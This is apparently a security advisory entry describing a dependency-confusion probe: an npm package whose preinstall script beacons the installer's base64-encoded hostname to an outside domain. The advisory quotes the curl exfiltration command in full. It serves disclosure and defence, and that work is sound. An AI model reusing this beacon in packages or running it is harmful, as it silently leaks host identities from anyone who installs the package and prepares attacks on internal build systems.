summary: Dependency-confusion probe exfiltrates installer hostname via preinstall beacon
details: The package.json preinstall script runs `curl https://bxss.boll-sec.de/hostname_$(uname -n | base64)`, unconditionally sending the base64-encoded hostname of any machine that runs `npm install` to an external third-party domain. The package ships no real code (description is `bla`, author is empty, main entry is absent) — the beacon is its only behavior. The `@united-airlines-org` scope plus reconnaissance-only payload matches the dependency-confusion probe pattern: identify build systems that resolve this internal-looking name to public npm so a follow-on malicious version can gain code execution on that internal infrastructure.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
